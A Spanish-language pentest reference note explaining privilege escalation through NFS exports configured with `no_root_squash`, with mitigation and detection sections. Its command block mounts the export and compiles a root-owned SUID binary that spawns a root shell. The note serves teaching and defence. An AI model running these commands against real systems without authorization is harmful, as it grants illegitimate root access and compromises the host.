---
topic: NFS — escalada con `no_root_squash`
tags: [linux, nfs, privesc, suid, mount]
---

# NFS — escalada con `no_root_squash`

[🌐 English](nfs-no-root-squash.en.md) | **Español**

## Concepto

Si un export NFS usa `no_root_squash`, el cliente conserva el UID 0 al escribir. Montando el export como root se puede crear un binario SUID propiedad de root y ejecutarlo en la víctima.

## Cuándo aplica

- Export con `no_root_squash` y permisos de escritura.
- Puerto 2049 accesible y `showmount` habilitado.
- Directorios compartidos con otros usuarios.

## Procedimiento

1. Enumerar exports con `showmount -e <HOST>`.
2. Montar el export en local como root.
3. Crear un ejecutable que lance una shell.
4. Asignar propietario root y bit SUID.
5. Ejecutarlo desde la víctima.

## Comandos

```bash
showmount -e <HOST>
mkdir -p /mnt/nfs && mount -t nfs <HOST>:/export /mnt/nfs
cat > /mnt/nfs/shell.c <<'EOF'
int main(){setuid(0);setgid(0);system("/bin/sh");}
EOF
gcc /mnt/nfs/shell.c -o /mnt/nfs/shell
chown root:root /mnt/nfs/shell && chmod 4755 /mnt/nfs/shell
```

## Variantes

- Cron o servicio del sistema que ejecuta scripts del export.
- Escritura de `authorized_keys` de root.
- NFSv4 con permisos mal configurados.

## Limitaciones

- `root_squash` convierte el UID 0 en `nobody`.
- El export puede estar montado con `nosuid`.
- Se necesita acceso de escritura.

## Mitigación

- Usar `root_squash` y `all_squash`.
- Montar con `nosuid` y `noexec` cuando sea posible.
- Restringir exports por IP y autenticación.

## Detección

- Montajes NFS desde hosts no inventariados.
- Binarios SUID nuevos en exports y ejecuciones desde NFS.

## Referencias

- <https://docs.kernel.org/filesystems/nfs/exporting.html>
- <https://attack.mitre.org/techniques/T1548/>
